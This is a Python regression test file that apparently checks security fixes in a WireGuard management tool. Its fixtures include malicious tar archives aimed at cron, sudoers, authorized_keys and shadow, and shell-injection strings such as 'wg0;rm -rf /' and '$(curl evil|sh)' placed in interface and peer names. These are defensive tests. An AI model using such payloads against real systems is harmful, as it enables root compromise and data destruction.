"""Regression tests for the vulnerabilities found in the v1.1 audit.

Each of these corresponds to a real defect that existed in this codebase, not
to a hypothetical. They are here so that a future refactor cannot quietly
reintroduce one.
"""

from __future__ import annotations

import io
import os
import sys
import tarfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from fake import FakeTransport, demo_facts

from tessera.core import adopt, backup, netcalc
from tessera.core.engines.wireguard import WireGuardEngine
from tessera.core.models import Facts, WireGuardConfig
from tessera.core.transport import SSHTransport


def _tar(members):
    """members: [(name, type, body, linkname)]"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, kind, body, link in members:
            info = tarfile.TarInfo(name)
            info.type = kind
            if kind == tarfile.SYMTYPE:
                info.linkname = link
                tar.addfile(info)
            elif kind == tarfile.DIRTYPE:
                tar.addfile(info)
            else:
                data = body.encode()
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


# --------------------------------------------------------------------------- #
def test_restore_cannot_write_outside_its_directories():
    """Was: `tar xzf -C / --absolute-names` obeyed any path in the archive.

    Restore runs as root, and the archive comes from outside the program.
    """
    evil = _tar([
        ("/etc/wireguard/wg0.conf", tarfile.REGTYPE, "[Interface]", None),
        ("/etc/cron.d/pwn", tarfile.REGTYPE, "* * * * * root sh", None),
        ("/root/.ssh/authorized_keys", tarfile.REGTYPE, "ssh-rsa EVIL", None),
        ("/etc/sudoers.d/pwn", tarfile.REGTYPE, "nobody ALL=(ALL) NOPASSWD:ALL", None),
        ("etc/tessera/../../../etc/shadow", tarfile.REGTYPE, "root::0", None),
    ])
    kept, rejected = backup.inspect(evil)
    assert kept == ["etc/wireguard/wg0.conf"], kept
    assert len(rejected) == 4, rejected
    for path in ("cron.d", "authorized_keys", "sudoers", "shadow"):
        assert any(path in r for r in rejected), path
    print("  4 escape attempts refused, 1 legitimate file kept")


def test_restore_refuses_symlink_members():
    """A symlink member turns a permitted directory into a write anywhere."""
    evil = _tar([
        ("/etc/wireguard/escape", tarfile.SYMTYPE, "", "/root/.ssh"),
        ("/etc/wireguard/escape/authorized_keys", tarfile.REGTYPE, "EVIL", None),
    ])
    kept, rejected = backup.inspect(evil)
    assert any("symlink" in r for r in rejected), rejected
    assert "etc/wireguard/escape" not in kept
    print("  symlink member refused")


def test_restore_strips_setuid_and_ownership():
    payload = _tar([("/etc/tessera/x.sh", tarfile.REGTYPE, "#!/bin/sh", None)])
    with tarfile.open(fileobj=io.BytesIO(payload), mode="r:gz") as tar:
        m = tar.getmembers()[0]
        m.mode = 0o4777
        m.uid = 1000
    clean, _ = backup.sanitise(payload)
    with tarfile.open(fileobj=io.BytesIO(clean), mode="r:gz") as tar:
        for member in tar.getmembers():
            assert not (member.mode & 0o4000), "setuid bit survived"
            assert not (member.mode & 0o2000), "setgid bit survived"
            assert member.uid == 0 and member.gid == 0, "ownership carried over"
    print("  setuid/setgid stripped, ownership reset to root")


def test_restore_does_not_stage_in_a_predictable_temp_path():
    """Was: /tmp/tessera-restore.tgz, pre-creatable as a symlink by any user."""
    t = FakeTransport()
    backup.push(t, _tar([("/etc/tessera/state.json", tarfile.REGTYPE, "{}", None)]))
    sent = t.all_text()
    assert "/tmp/tessera-restore" not in sent, "predictable temp path is back"
    assert "mktemp" in sent, "staging file must be created with mktemp"
    assert "--absolute-names" not in sent, "absolute extraction is back"
    print("  staged via mktemp in a root-only directory")


# --------------------------------------------------------------------------- #
def test_interface_name_cannot_inject_shell():
    """Was: the interface name was interpolated into a root-run script.

    adopt() learns that name from a filename, and "wg0$(id).conf" is a legal
    filename.
    """
    for hostile in ("wg0$(id)", "wg0;rm -rf /", "wg0`id`", "wg0|sh", "../etc"):
        cfg = WireGuardConfig()
        cfg.interface = hostile
        try:
            WireGuardEngine()._render_firewall(Facts(nic="eth0"), cfg)
            raise AssertionError("{} was accepted".format(hostile))
        except AssertionError:
            raise
        except Exception:
            pass
    script = WireGuardEngine()._render_firewall(Facts(nic="eth0"),
                                                WireGuardConfig())
    body = [l for l in script.splitlines()
            if not l.strip().startswith("#") and "IFACE=" not in l]
    assert not [l for l in body if "wg0" in l], \
        "the interface name must only appear in the quoted assignment"
    print("  5 hostile names refused; benign name never inlined")


def test_adopt_refuses_a_hostile_interface_filename():
    t = FakeTransport(responses={
        r"ls -1 /etc/wireguard": "/etc/wireguard/wg0$(id).conf\n"})
    t.which = lambda b: None
    try:
        adopt.discover(t, demo_facts())
        raise AssertionError("hostile filename was adopted")
    except AssertionError:
        raise
    except Exception as exc:
        assert "not a valid interface name" in str(exc), exc
    print("  adopt refuses it at the boundary")


def test_adopted_peer_names_are_sanitised():
    for hostile, expected_safe in [("$(curl evil|sh)", "curl-evil-sh"),
                                   ("a\tb", "a-b"),
                                   ("../../etc/passwd", "peer-1")]:
        name, note = adopt.safe_peer_name(hostile, "peer-1")
        assert adopt.SAFE_NAME.match(name), name
        assert "\t" not in name and "$" not in name and ";" not in name
        assert note, "the original must be recorded"
    print("  shell metacharacters and tabs removed, original kept in the note")


def test_expiry_table_refuses_unparseable_rows():
    """A tab in a name would shift every column the revoker reads."""
    from tessera.core.expiry import render_table
    from tessera.core.models import Peer
    good = Peer(name="ok", engine="wireguard", interface="wg0",
                public_key="AAA=", access_expires="2026-12-31")
    bad = Peer(name="a\tb", engine="wireguard", interface="wg0",
               public_key="BBB=", access_expires="2026-12-31")
    table = render_table([good, bad])
    rows = [l for l in table.splitlines() if not l.startswith("#")]
    assert len(rows) == 1 and rows[0].startswith("wireguard\tok\t"), rows
    print("  row with an embedded tab dropped rather than written")


# --------------------------------------------------------------------------- #
def test_ssh_host_key_checking_cannot_be_disabled():
    """Was: extra_opts could pass StrictHostKeyChecking=no straight through."""
    for hostile in ("StrictHostKeyChecking=no",
                    "stricthostkeychecking = no",
                    "UserKnownHostsFile=/dev/null"):
        t = SSHTransport("h", multiplex=False, extra_opts=[hostile])
        try:
            t._base_args()
            raise AssertionError("{} was accepted".format(hostile))
        except AssertionError:
            raise
        except Exception:
            pass
    default = " ".join(SSHTransport("h", multiplex=False)._base_args())
    assert "StrictHostKeyChecking=accept-new" in default
    strict = " ".join(SSHTransport("h", multiplex=False,
                                   strict_host_keys=True)._base_args())
    assert "StrictHostKeyChecking=yes" in strict
    print("  bypass refused; accept-new by default, yes on request")


def test_secrets_never_reach_a_command_line():
    """Key material goes over stdin, never argv - ps is world-readable."""
    sent = []

    class Probe(FakeTransport):
        def run_root(self, command, **kw):
            sent.append(command)
            return super().run_root(command, **kw)

    t = Probe()
    secret = "SUPERSECRETKEYMATERIAL1234567890="
    t.write_file("/etc/wireguard/wg0.conf", "PrivateKey = " + secret, "0600")
    assert not any(secret in c for c in sent), "secret appeared in a command"
    print("  private key never appears in argv")


def test_heredoc_delimiter_cannot_be_forced():
    """Content equal to the delimiter would end the heredoc early."""
    captured = {}

    class Probe(FakeTransport):
        def write_file(self, path, content, mode="0600"):
            # Exercise the real implementation, not the fake's override.
            from tessera.core.transport import Transport
            return Transport.write_file(self, path, content, mode)

        def run_root(self, command, **kw):
            captured["script"] = kw.get("input_text", "")
            return super().run_root(command, **kw)

    t = Probe()
    t.write_file("/tmp/x", "line1\nline2\n")
    script = captured["script"]
    import re
    delim = re.search(r"<<'(TESSERA_[0-9A-F]+)'", script).group(1)
    body = script.split(delim + "\n", 1)[1].rsplit("\n" + delim, 1)[0]
    assert delim not in body, "delimiter appears inside the payload"
    print("  delimiter is random and re-rolled on collision")


def test_interface_validator_matches_the_kernel():
    ok = ["wg0", "wg-home", "tun_1", "a", "abcdefghijklmno"]
    bad = ["", "a" * 16, "-lead", "wg 0", "wg/0", "wg;0", "wg$0", "../x"]
    for name in ok:
        assert netcalc.validate_iface(name)[0], name
    for name in bad:
        assert not netcalc.validate_iface(name)[0], name
    print("  {} accepted, {} refused".format(len(ok), len(bad)))


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failed = 0
    for fn in tests:
        print(fn.__name__)
        try:
            fn()
        except Exception as exc:                               # noqa: BLE001
            failed += 1
            import traceback
            traceback.print_exc()
    print("\n{}/{} passed".format(len(tests) - failed, len(tests)))
    sys.exit(1 if failed else 0)
